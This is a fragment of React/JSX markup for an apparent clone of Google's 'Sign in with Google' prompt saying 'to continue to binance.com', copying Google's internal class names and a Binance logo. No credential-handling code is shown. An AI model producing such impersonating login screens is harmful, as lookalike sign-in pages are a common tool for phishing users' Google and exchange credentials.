    ...
    return (
        <div className="sm:bg-[#f0f4f9] bg-white text-black sm:flex flex-col w-full justify-center items-center h-screen">
            ...
            <div className={`bg-white rounded-[28px] flex flex-col sm:max-w-[480px] lg:max-w-[965px] w-full min-h-[384px] lg:h-[400px] mx-auto`}>
                ...
                <div className={`w-full flex ${isLoading ? 'opacity-50 pointer-events-none' : 'opacity-100'} items-center px-4 pt-4 pb-3 border-b border-[#c4c7c5]`}>
                    <svg className="th8JXc mr-[12px]" xmlns="https://www.w3.org/2000/svg" width="20" height="24" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff">
                    ...
                    <div className='google mt-1 text-sm'>Sign in with Google</div>
                </div>
                    ...
                    <div className='justify-between flex-col p-[24px] sm:p-0 gap-y-2 lg:gap-y-8 lg:flex-row flex w-full'>
                        <div>
                            <div className='h-[48px] w-[48px]'>
                                <img src="https://lh3.googleusercontent.com/89koR46wNEOHYkbF86ZlmxqGlPO5WQiMuWLDzir_AVDZ2yMRspD25KMvauINOtZxmlSH" className="dJRqtd TrZEUc" alt="binance.com" data-iml="3115.10000000149" data-atf="true" />
                            </div>
                            <div className='mt-6'>
                                <h1 className='lg:text-4xl text-[28px]  google'>Sign in</h1>
                                <p className='mt-[19px] google'>to continue to <a href="" className='text-blue-700'>binance.com</a></p>
                            </div>
                        </div>
